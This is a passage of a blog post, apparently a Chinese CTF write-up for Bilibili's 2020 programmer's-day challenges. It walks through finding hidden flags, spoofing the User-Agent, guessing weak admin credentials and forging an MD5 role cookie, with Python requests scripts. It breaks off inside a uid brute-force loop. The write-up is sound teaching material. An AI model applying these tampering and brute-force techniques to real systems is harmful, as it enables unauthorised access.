@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+	
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="baidu-site-verification" content="o4pXUBsPyW" />
+	
+    <!--Description-->
+    
+        <meta name="description" content="To be more curious and less lazy.">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Chen Dian">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="【Requests】Bilibili Security 1024程序节 CTF记录"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="To be more curious and less lazy." />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="CDPlayer&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>【Requests】Bilibili Security 1024程序节 CTF记录 - CDPlayer&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Google Analytics -->
+    
+
+	
+	<!-- Baidu Analytics -->
+    
+	<script type="text/javascript">
+		var _hmt = _hmt || [];
+		(function() {
+		  var hm = document.createElement("script");
+		  hm.src = "https://hm.baidu.com/hm.js?{{ theme.baidu_analytics }}";
+		  var s = document.getElementsByTagName("script")[0];
+		  s.parentNode.insertBefore(hm, s);
+		})();
+	</script>
+
+
+	
+	<!-- star map -->
+	<script type="text/javascript" color="255,255,255" opacity='0.75' zIndex="-2" count="88" src="js/canvas.js"></script>
+	
+	<!-- Earth -->
+	<script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5mihyim0z76&amp;m=7&amp;c=66ccff&amp;cr1=ff0000&amp;f=arial&amp;l=0&amp;lx=200&amp;ly=-20&amp;hi=10" async="async"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    About
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/articles/2020-10/%E3%80%90Requests%E3%80%91Bilibili%20Security%201024%E7%A8%8B%E5%BA%8F%E8%8A%82%20CTF%E8%AE%B0%E5%BD%95.html">
+                【Requests】Bilibili Security 1024程序节 CTF记录
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-10-24</span>
+            
+            
+                <a href="#disqus_thread" class="comments">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/日常记录/">日常记录</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+		<!-- MathJax support -->
+		
+
+		
+        <!-- Post Content -->
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>B站搞了个1024程序员节，看起来是个 toy CTF，有点开心。<br>于是想到了曾经在CTF和ACM的路口选择了ACM，CTF一直是心中的一点遗憾，想着要不咱……玩玩看？</p>
+<p>【写在前面】这次有点意思，可能 flag 是需要和各位自己的 uid 有某些计算的，不同账号同一时间以及相同账号不同时间的答案居然会有不同，看来是为了防止无脑抄袭，至少还是需要用自己的 uid 亲自走一遍流程的，不错不错。</p>
+<span id="more"></span>
+
+<p><img src="https://img-blog.csdnimg.cn/20201024231924798.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201024232205831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="0x01-养成看到网页就F12的好习惯"><a href="#0x01-养成看到网页就F12的好习惯" class="headerlink" title="0x01 养成看到网页就F12的好习惯"></a>0x01 养成看到网页就F12的好习惯</h2><blockquote>
+<p>页面的背后是什么？<br>题目地址： <a target="_blank" rel="noopener" href="http://45.113.201.36/index.html">http://45.113.201.36/index.html</a></p>
+</blockquote>
+<p>说到网页的“背后”，一般想到的就是有东西被隐藏了，我们可以直接审查元素看到果然有个 hidden：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;banner&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;img src=&quot;banner.png&quot; alt=&quot;哔哩哔哩&quot; ondragstart=&quot;return false;&quot;&gt;--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;api/images?file=banner.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;哔哩哔哩&quot;</span> <span class="attr">ondragstart</span>=<span class="string">&quot;return false;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到哔哩哔哩星球！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">&quot;getintouch&quot;</span> <span class="attr">class</span>=<span class="string">&quot;flipInX animated&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border-bottom: 0;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;flag1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">values</span>=<span class="string">&quot;flag1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">id</span>=<span class="string">&quot;flag2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把 hidden 删掉，或者直接从审查元素里把 flag 拖出来复制就好啦 ~</p>
+<p><img src="https://img-blog.csdnimg.cn/20201024232559406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="0x02-Headers-amp-User-Agent"><a href="#0x02-Headers-amp-User-Agent" class="headerlink" title="0x02 Headers &amp; User Agent"></a>0x02 Headers &amp; User Agent</h2><blockquote>
+<p>真正的秘密只有特殊的设备才能看到<br>题目地址： <a target="_blank" rel="noopener" href="http://45.113.201.36/index.html">http://45.113.201.36/index.html</a></p>
+</blockquote>
+<p>页面地址和刚才的一样，说到特殊的设备，我的第一反应其实是“大概要用移动端吧”，所以即便看到了网页源码里没有区分设备的代码，我也抱着“可能有 User Agent 分流的高端操作”的想法用手机看了看。<br>—— “HTTP 406 请先登陆”<br>—— “HTTP 403”<br>哦对不起，看来是我搞错了。<br>然后我们回到页面上来，有这么一句话叫做：</p>
+<blockquote>
+<p>需要使用bilibili Security Browser浏览器访问～</p>
+</blockquote>
+<p>打开网页的审查元素，我们可以看到：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &quot;api/ctf/2&quot;,</span><br><span class="line">    type: &quot;get&quot;,</span><br><span class="line">    success:function (data) &#123;</span><br><span class="line">        //console.log(data);</span><br><span class="line">        if (data.code == 200)&#123;</span><br><span class="line">            // 如果有值：前端跳转</span><br><span class="line">            $(&#x27;#flag2&#x27;).html(&quot;flag2: &quot; + data.data);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 如果没值</span><br><span class="line">            $(&#x27;#flag2&#x27;).html(&quot;需要使用bilibili Security Browser浏览器访问～&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>简单解释一下就是，我们找一个叫做 “api/ctf/2” 的 API 要答案，如果它认识我们就给，不认识，那就不给。<br>根据页面的提示来看，我寻思着得用 bilibili 安全浏览器了，但哪有这浏览器呀，那意思是……<br>User Agent 是 “bilibili Security Browser”？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">	<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;45.113.201.36&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;bilibili Security Browser&#x27;</span>,</span><br><span class="line">	<span class="comment"># &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#x27;,</span></span><br><span class="line">	<span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Pragma&#x27;: &#x27;no-cache&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;Cache-Control&#x27;: &#x27;no-cache&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://45.113.201.36/api/ctf/2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    response = s.get(url=url, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>—— “HTTP 406： 请先登录”</p>
+<p>哦哦哦还要登录！ 那Cookie也得贴一下（安全起见，我挡一下session）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers.update&#123;</span><br><span class="line">	<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1aWQiOiI1NDc4NDAifQ.abcdef.SEwRNzYMFgFui75321FBJStdQeg&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好了拿到了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(eval(response.text)[&quot;msg&quot;])</span><br><span class="line">请先登录</span><br><span class="line">&gt;&gt;&gt; headers.update(&#123;&#x27;Cookie&#x27;: &#x27;session=eyJ1aWQiOiI1NDc4NDAifQ.abcdef.SEwRNzYMFgFui75321FBJStdQeg&#x27;&#125;)</span><br><span class="line">&gt;&gt;&gt; response = s.get(url=&#x27;http://45.113.201.36/api/ctf/2&#x27;, headers=headers)</span><br><span class="line">&gt;&gt;&gt; response.text</span><br><span class="line">&#x27;&#123;&quot;code&quot;:200,&quot;data&quot;:&quot;9535c0a5-41f5074d-44115638-63fa8d2d&quot;,&quot;msg&quot;:&quot;&quot;&#125;\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-我不承认弱密码是CTF的一种"><a href="#0x03-我不承认弱密码是CTF的一种" class="headerlink" title="0x03 我不承认弱密码是CTF的一种"></a>0x03 我不承认弱密码是CTF的一种</h2><blockquote>
+<p>密码是啥？<br>题目地址： <a target="_blank" rel="noopener" href="http://45.113.201.36/login.html">http://45.113.201.36/login.html</a></p>
+</blockquote>
+<p>上来就给了一个用户名密码让你填，看了看网页元素。<br>里面一个 ajax 的意思是对着 api 发送用户名密码，对了给 flag，错了不给。<br>第一反应尝试了一下 admin/admin，结果不对<br>然后试了一下 admin/123456，结果也不对<br>然后看了一下页面上 “二次元” 世界，欢迎来到 “哔哩哔哩星球” ……<br><img src="https://img-blog.csdnimg.cn/20201025194233693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>bilibili / bilibili 不对<br>admin / bilibili 呃…… 对了<br>这算是个什么题嘛！</p>
+<h2 id="0x04-超级管理员有几种写法"><a href="#0x04-超级管理员有几种写法" class="headerlink" title="0x04 超级管理员有几种写法"></a>0x04 超级管理员有几种写法</h2><blockquote>
+<p>对不起，权限不足～<br>题目地址： <a target="_blank" rel="noopener" href="http://45.113.201.36/superadmin.html">http://45.113.201.36/superadmin.html</a></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20201025195359725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>看了一眼，这个页面的 get 操作什么都没找我要，那么就是在 header 里做文章了，看了下Cookie分为两个部分，role 和 session，其中 role 是一个32位看起来很像16进制的字符串。<br>—— 难道这就是 flag？<br>—— （提交）哦不是<br>—— 那莫非是 MD5？</p>
+<p><img src="https://img-blog.csdnimg.cn/20201025193407336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>u开头的……四个字符…… 莫不是user吧哈哈哈。<br>然后试了一下…… 真的是…… </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(&quot;user&quot;) = ee11cbb19052e40b07aac0ca060c23ee</span><br></pre></td></tr></table></figure>
+<p>那我是不是只要用超级管理员的MD5来替换掉这个Cookie里的role就行了？<br>太简……单……哎？admin 的 MD5 也不对，superadmin 的 MD5 也不对？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MD5  </span></span><br><span class="line">user: ee11cbb19052e40b07aac0ca060c23ee</span><br><span class="line">admin: 21232f297a57a5a743894a0e4a801fc3</span><br><span class="line">bilibili: 130e29f351572e58c49fd4c910d7beb0</span><br><span class="line">superadmin: 17c4520f6cfd1ab53d8745e84681eb49</span><br><span class="line">超级管理员: 302ff00ddb9cb45c970a316e5212bb34</span><br><span class="line">administrator: 200ceb26807d6bf99fd6f4f0d1ca54d4</span><br><span class="line">Administrator: 7b7bc2512ee1fedcd76bdc68926d4f7b</span><br></pre></td></tr></table></figure>
+
+<p>于是实验了如此之多的情况，终于在最后一个超级管理员的单词上得到了正确的 flag（你用这词谁能第一时间想到啊！怒）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 省略 10000 字尝试过程</span><br><span class="line">&gt;&gt;&gt; data = &#123;&quot;username&quot;: &quot;superadmin&quot;&#125;</span><br><span class="line">&gt;&gt;&gt; data = &#123;&quot;role&quot;: &quot;superadmin&quot;&#125;</span><br><span class="line">&gt;&gt;&gt; response = s.get(url=&#x27;http://45.113.201.36/api/ctf/4&#x27;, data=data, headers=headers)</span><br><span class="line">&gt;&gt;&gt; response.text</span><br><span class="line">&#x27;&#123;&quot;code&quot;:&quot;403&quot;,&quot;data&quot;:&quot;&quot;,&quot;msg&quot;:&quot;&quot;&#125;\n&#x27;</span><br><span class="line">&gt;&gt;&gt; headers.update(&#123;</span><br><span class="line">... &#x27;Cookie&#x27;: &#x27;role=200ceb26807d6bf99fd6f4f0d1ca54d4; session=eyJ1aWQiOiI1NDc4NDAifQ.abcdef.YjyKwfR-LZ6zYDRgjbZyk6PArn0&#x27;,&#125;)</span><br><span class="line">&gt;&gt;&gt; response = s.get(url=&#x27;http://45.113.201.36/api/ctf/4&#x27;, data=data, headers=headers)</span><br><span class="line">&gt;&gt;&gt; response.text</span><br><span class="line">&#x27;&#123;&quot;code&quot;:&quot;403&quot;,&quot;data&quot;:&quot;&quot;,&quot;msg&quot;:&quot;&quot;&#125;\n&#x27;</span><br><span class="line">&gt;&gt;&gt; response = s.get(url=&#x27;http://45.113.201.36/api/ctf/4&#x27;, headers=headers)</span><br><span class="line">&gt;&gt;&gt; response.text</span><br><span class="line">&#x27;&#123;&quot;code&quot;:&quot;403&quot;,&quot;data&quot;:&quot;&quot;,&quot;msg&quot;:&quot;&quot;&#125;\n&#x27;</span><br><span class="line">&gt;&gt;&gt; headers.update(&#123;</span><br><span class="line">... &#x27;Cookie&#x27;: &#x27;role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=eyJ1aWQiOiI1NDc4NDAifQ.abcdef.YjyKwfR-LZ6zYDRgjbZyk6PArn0&#x27;,&#125;)</span><br><span class="line">&gt;&gt;&gt; response = s.get(url=&#x27;http://45.113.201.36/api/ctf/4&#x27;, headers=headers)</span><br><span class="line">&gt;&gt;&gt; response.text</span><br><span class="line">&#x27;&#123;&quot;code&quot;:200,&quot;data&quot;:&quot;9683e651-a291e88e-056553b8-30141099&quot;,&quot;msg&quot;:&quot;&quot;&#125;\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-暴力破解真的是一种美学吗"><a href="#0x05-暴力破解真的是一种美学吗" class="headerlink" title="0x05 暴力破解真的是一种美学吗"></a>0x05 暴力破解真的是一种美学吗</h2><blockquote>
+<p>别人的秘密<br>题目地址： <a target="_blank" rel="noopener" href="http://45.113.201.36/user.html">http://45.113.201.36/user.html</a></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20201025195451153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">   $(function () &#123;</span><br><span class="line"></span><br><span class="line">       (function ($) &#123;</span><br><span class="line">           $.getUrlParam = function(name) &#123;</span><br><span class="line">               var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);</span><br><span class="line">               var r = window.location.search;</span><br><span class="line">console.log(r);</span><br><span class="line">r = r.substr(1).match(reg);</span><br><span class="line">               if (r != null) return unescape(r[2]); return null;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;)(jQuery);</span><br><span class="line">   </span><br><span class="line">       var uid = $.getUrlParam(&#x27;uid&#x27;);</span><br><span class="line">       if (uid == null) &#123;</span><br><span class="line">           uid = 100336889;</span><br><span class="line">       &#125;</span><br><span class="line">       $.ajax(&#123;</span><br><span class="line">           url: &quot;api/ctf/5?uid=&quot; + uid,</span><br><span class="line">           type: &quot;get&quot;,</span><br><span class="line">           success:function (data) &#123;</span><br><span class="line">               console.log(data);</span><br><span class="line">               if (data.code == 200)&#123;</span><br><span class="line">                   // 如果有值：前端跳转</span><br><span class="line">                   $(&#x27;#flag&#x27;).html(&quot;欢迎超级管理员登陆～flag : &quot; + data.data )</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   // 如果没值</span><br><span class="line">                   $(&#x27;#flag&#x27;).html(&quot;这里没有你想要的答案～&quot;)</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;)</span><br><span class="line">   &#125;);</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到，这题一上来摆明了告诉你我就找你要一个 uid。<br>没有提供 uid 的情况下会直接用一个默认的（这个默认的 uid 我也去看了，确实应该就是个普通吃瓜观众）<br>我第一时间实验了 ⑨bishi老爷的uid，已婚的uid，都不对。<br>然后去看 22娘 33娘 好像也没有官方认证的账号，uid 也无从得知。<br>那就很无奈的只能暴搜了……</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> configparser <span class="keyword">import</span> RawConfigParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=eyJ1aWQiOiI1NDc4NDAifQ.X5QVaw.SEwRNzYMFgFui7Tzo1FBJStdQeg&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;45.113.201.36&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Pragma&#x27;: &#x27;no-cache&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;Cache-Control&#x27;: &#x27;no-cache&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># self.headers = None</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://45.113.201.36/api/ctf/5?uid=&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># for i in range(10000):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 